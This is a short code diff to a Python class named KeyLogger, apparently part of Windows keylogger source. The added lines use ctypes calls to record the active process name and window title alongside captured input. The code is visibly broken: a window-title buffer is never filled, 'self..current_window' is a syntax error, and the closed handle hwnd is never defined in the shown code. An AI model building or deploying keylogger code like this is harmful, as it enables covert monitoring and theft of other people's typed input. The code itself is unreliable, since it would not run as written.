@@ -24,4 +24,13 @@ class KeyLogger:
         h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
         windll.psapi.GetModuleBaseNameA(
                     h_process, None, byref(executable), 512)
-            
+        window_title = create_string_buffer(512)
+        try:
+            self.current_window = window_title.value.decode()
+        except UnicodeDecodeError as e:
+            print(f'{e}: window name unknow')
+
+        print('\n', process_id, executable.value.decode(), self..current_window)
+
+        windll.kernel32.CloseHandle(hwnd)
+        windll.kernel32.CloseHandle(h_process)
